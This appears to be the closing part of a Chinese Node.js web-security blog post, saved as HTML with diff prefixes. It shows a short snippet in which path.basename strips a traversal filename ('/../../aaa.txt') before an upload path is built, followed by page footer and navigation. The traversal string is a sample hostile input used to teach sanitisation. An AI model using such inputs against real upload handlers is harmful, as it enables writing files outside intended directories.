+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> dir = <span class="string">'/public/upload/'</span>;</span><br><span class="line"><span class="keyword">const</span> name = <span class="string">'/../../aaa.txt'</span>;</span><br><span class="line"><span class="keyword">const</span> file = <span class="built_in">Date</span>.now() + <span class="string">'-'</span> +  path.basename(name);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(path.join(dir, file)); <span class="comment">// \public\upload\1495440679333-aaa.txt</span></span><br></pre></td></tr></table></figure>
+<p><code>path.basename</code> 用于提取出用 <code>/</code>隔开的 path 的最后一部分，也就上上面的 <code>aaa.txt</code> 部分。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2021-06-15T06:10:52.922Z" itemprop="dateUpdated">2021年6月15日 14:10</time>
+</span><br>
+
+
+        <br /><b style="color:#f66">版权声明</b> - Lizhooh，未经允许禁止转载！！！经允许的请声明：<div style='height:8px'></div><b>作者</b>：Lizhooh 未来是全栈工程师<br /><b>原文</b>：<a href="/stories/2017/05/网络安全/Nodejs Web 攻击/" target="_blank" rel="external">http://me.lizhooh.com/stories/2017/05/网络安全/Nodejs Web 攻击/</a>
+    </div>
+    <footer>
+        <a href="http://me.lizhooh.com">
+            <img src="/img/my.png" alt="Lizhooh">
+            Lizhooh
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Nodejs/">Nodejs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/后端/">后端</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
+
+
+            
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/stories/2017/05/React Native/React Native [ 混合开发 ] 自定义原生模块 - 入门/" id="post-prev" class="post-nav-link">
+        <!-- <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> 上一篇</div> -->
+        <h4 class="title">React Native [ 混合开发 ] 自定义原生模块 - 入门</h4>
+        <h4 class="summary">原生模块有时候 App 需要访问平台 API，但 React Native 可能还没有相应的模块包装；或者你需要复用一些...</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/stories/2017/05/React Native/Media/React Native Image-Picker 的使用/" id="post-next" class="post-nav-link">
+        <!-- <div class="tips">下一篇 <i class="icon icon-angle-right icon-lg icon-pl"></i></div> -->
+        <h4 class="title">React Native Image-Picker 的使用</h4>
+        <h4 class="summary">Image-Pickerreact-native-image-picker使用一个，直接调用底层 API 的一个图片选择...</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        <p>
+            <span><i class="icon icon-lg icon-rss"></i></span>
+            <span>博客内容属于原创创作，未授权转载者必追究其法律责任。</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p>
+            <span>
+                对酒当歌，人生几何！
+                <i class="icon icon-heart-o" style="font-weight: bold;"></i>
+                Lizhooh 的技术博客 &copy; 
+                2016 - 2021
+
+                <!--Power by <a href="http://hexo.io/" target="_blank">Hexo</a>-->
+             </span>
+        </p>
+
+
+    </div>
+</footer>
+
+    </main>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+    <!--<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>-->
+<script>
+var BLOG = { ROOT: '/', SHARE: false, REWARD: false };
+</script>
+
+<script src="//lib.baomitu.com/tippy.js/3.0.2/tippy.all.min.js"></script>
+<script src="//lib.baomitu.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/waves.min.js"></script>
+<script src="/js/rest.js"></script>
+<script src="/js/main.min.js?v=2.2.0"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script async src="/js/search.min.js?v=2.2.0"></script>
+
+
+
+
+
+    <div class="music" id="music"></div>
+</body>
+</html>
